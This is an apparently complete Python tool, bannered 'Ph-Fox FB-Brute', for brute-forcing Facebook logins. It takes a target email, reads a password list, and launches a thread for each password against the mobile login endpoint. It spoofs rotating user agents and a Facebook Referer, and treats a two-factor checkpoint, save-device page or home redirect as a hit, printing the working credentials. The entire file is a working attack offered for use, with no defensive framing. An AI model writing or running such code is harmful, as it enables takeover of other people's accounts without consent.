from urllib.parse import urlparse
import threading, requests, bs4, random, os

USER_AGENTS = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/601.1.10 (KHTML, like Gecko) Version/8.0.5 Safari/601.1.10",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; ; NCT50_AAP285C84A1328) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1",
    "Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
]

def banner():
	os.system('cls')
	print("""

░█▀▀█ █──█ ── ░█▀▀▀ █▀▀█ █─█ 　 ░█▀▀▀ ░█▀▀█ ── ░█▀▀█ ░█▀▀█ ░█─░█ ▀▀█▀▀ ░█▀▀▀ 
░█▄▄█ █▀▀█ ▀▀ ░█▀▀▀ █──█ ▄▀▄ 　 ░█▀▀▀ ░█▀▀▄ ▀▀ ░█▀▀▄ ░█▄▄▀ ░█─░█ ─░█── ░█▀▀▀ 
░█─── ▀──▀ ── ░█─── ▀▀▀▀ ▀─▀ 　 ░█─── ░█▄▄█ ── ░█▄▄█ ░█─░█ ─▀▄▄▀ ─░█── ░█▄▄▄
  """)

def is_home(url):
    parts = urlparse(url)
    return "home" in parts.path or "/" == parts.path

def find_input_fields(html):
    return bs4.BeautifulSoup(html, "html.parser", parse_only=bs4.SoupStrainer("input"))

def session_factory(user_agent=None):
    session = requests.session()
    session.headers["Referer"] = "https://www.facebook.com"
    session.headers["Accept"] = "text/html"

    session.headers["User-Agent"] = user_agent or random.choice(USER_AGENTS)
    return session

def Login(em, ps, user_agent=None):
	session = session_factory(user_agent=user_agent)
	soup = find_input_fields(session.get("https://m.facebook.com/").text)
	data = dict(
		(elem["name"], elem["value"])
		for elem in soup
		if elem.has_attr("value") and elem.has_attr("name")
	)
	data["email"] = em
	data["pass"] = ps
	data["login"] = "Log In"
	r = session.post("https://m.facebook.com/login.php?login_attempt=1", data=data)

	if "checkpoint" in r.url and ('id="approvals_code"' in r.text.lower()):
		return True

	if "save-device" in r.url:
		return True

	if is_home(r.url):
		return True

	else:
		return False

def Brute(em, ps):
	status = Login(em, ps)
	if(status):
		print('[Success!]=> User: {}|Pass: {}'.format(em,ps))
		os._exit(0)
	else:
		print('[Failure]=> User: {}|Pass: {}'.format(em,ps))


if __name__ == "__main__":
	banner()
	em = input('Enter target email: ')
	ps_list = open('passwords.txt').read().splitlines()
	for ps in ps_list:
		threading.Thread(target=Brute,args=[em,ps]).start()

